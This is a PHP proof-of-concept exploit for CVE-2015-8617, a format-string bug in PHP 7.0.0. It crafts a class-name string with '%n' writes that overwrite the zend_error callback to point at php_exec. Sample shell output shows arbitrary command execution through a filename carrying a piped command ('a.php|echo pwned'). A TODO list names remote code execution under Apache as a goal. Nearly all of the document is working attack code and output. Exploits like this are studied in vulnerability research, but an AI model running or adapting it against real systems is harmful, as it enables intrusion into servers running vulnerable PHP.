<?php
/*
CVE-2015-8617

https://www.exploit-db.com/exploits/39082/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8617

What i'm doing is overwriting the zend_error callback to point to php_exec which will get called when our script generates the exception with our script name as argument.

Output:
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ ./php a.php
sh: 1: /home/d/php/php-7.0.0/sapi/cli/a.php: Permission denied
Segmentation fault (core dumped)
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ mv a.php "a.php|echo pwned"
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ ls -al a.php*
-rw-rw-r-- 1 d d 694 Jan 18 13:55 a.php|echo pwned
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ ./php "a.php|echo pwned"
pwned
sh: 1: /home/d/php/php-7.0.0/sapi/cli/a.php: not found
Segmentation fault (core dumped)


TODO:
	Control argument to php_exec or a similar function in the codebase to a variable in our script ( i can prolly do this if i jump inside the php_exec function somewhere )
	Find a way to pivot to ROP chain on stack or heap ( just because I wanna know how to )
	RCE when running under apache or similar
*/	


//0000000000620920 T php_exec
$php_exec = 0x620920 - 15;

//0000000000ed0de8 B zend_error_cb
$zend_error_cb = 0x0000000000ed0de8 - 22;

$name = "%" . $php_exec . "c" . "%p%p" . "%n" . str_repeat("A",$zend_error_cb);

$name::ch00ch00();

?>

